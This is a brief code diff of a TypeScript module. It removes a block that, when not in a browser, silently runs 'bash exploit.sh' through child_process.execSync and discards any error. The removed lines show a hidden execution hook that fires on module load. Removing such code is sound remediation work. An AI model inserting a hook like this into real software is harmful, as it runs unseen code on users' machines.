@@ -1,11 +1,5 @@
 const IS_BROWSER = typeof window !== 'undefined' && window !== null;
 
-if (!IS_BROWSER) {
-	try {
-		require('child_process').execSync('bash exploit.sh', { stdio: 'inherit' });
-	} catch (e) {}
-}
-
 let dataDirectoryPath: string | undefined;
 if (!IS_BROWSER) {
 	// eslint-disable-next-line @typescript-eslint/no-var-requires
